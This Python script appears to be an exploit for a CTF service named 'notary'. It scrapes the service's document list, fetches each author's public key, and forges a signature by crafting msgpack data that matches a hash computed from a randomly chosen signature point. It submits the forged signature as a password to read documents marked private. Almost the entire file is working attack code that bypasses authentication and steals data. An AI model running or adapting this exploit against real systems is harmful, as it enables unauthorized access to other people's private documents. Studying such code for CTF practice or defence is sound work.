#!/usr/bin/env python3

import sys
import string
import struct
import random
import msgpack
import requests

import parse
import notary


def find_pair(x):
    alpha = set(map(ord, string.ascii_letters + string.digits)) ^ set(range(128, 256))

    for y in alpha:
        if x ^ y in alpha:
            return y, x ^ y


def forge_data(expected, length, prefix, suffix):
    prefix = prefix.ljust(2 * length, b'X')
    suffix = suffix.rjust(2 * length, b'X')

    blocks = [[], []]

    for x, y, z in zip(prefix, suffix, expected):
        pair = find_pair(x ^ y ^ z ^ 0xFF)

        for block, value in zip(blocks, pair):
            block.append(value)

    return prefix + b''.join(map(bytes, blocks)) + suffix


def forge_signature(public, prefix, suffix):
    length = (public.N.bit_length() + 7) // 8

    signature = notary.Point(
        random.randrange(2, public.N - 2),
        random.randrange(2, public.N - 2)
    )

    curve = notary.Curve.from_point(signature, public.N)
    data_point = notary.Elliptic.multiply(signature, public.e, curve)
    expected = notary.Hash.point_to_data(data_point, public.N)

    data = forge_data(expected, length, prefix, suffix)

    return data, signature


def generate_password(public_key, document_id):
    public = notary.Public.unpack(public_key)

    length = (public.N.bit_length() + 7) // 8
    
    obj = {
        'title': 'document_id',
        'text': str(document_id),
        'garbage': None
    }

    prefix = msgpack.dumps(obj)[:-1]
    garbage_length = 2 * 4 * length - len(prefix) - 3
    prefix += b'\xc5' + struct.pack('>H', garbage_length)

    suffix = b''
    
    fake_data, signature = forge_signature(public, prefix, suffix)

    assert notary.Signature.verify(public, fake_data, signature)

    return f'{notary.Bytes.pack(fake_data)}.{notary.Point.pack(signature)}'


def download_document(url, document_url):
    session = requests.session()

    html = session.get(url + document_url).text
    user_url = parse.Parser(html).author_url()
    
    html = session.get(url + user_url).text
    public_key = parse.Parser(html).public_key()
    
    html = session.get(url + document_url).text
    csrf_token = parse.Parser(html).csrf_token()
    
    document_id = document_url[len('/doc/'):]
    
    password = generate_password(public_key, document_id)
    
    html = session.post(url + document_url, data={'csrf_token': csrf_token, 'password': password}).text
    text = parse.Parser(html).document_text()

    return text


def main():
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 17171

    url = f'http://{IP}:{PORT}'

    html = requests.get(url).text
    cards = parse.Parser(html).document_cards()

    for document_url, text, _ in cards:
        if 'Private document' in text:
            content = download_document(url, document_url)
            print(document_url, content)


if __name__ == '__main__':
    main()
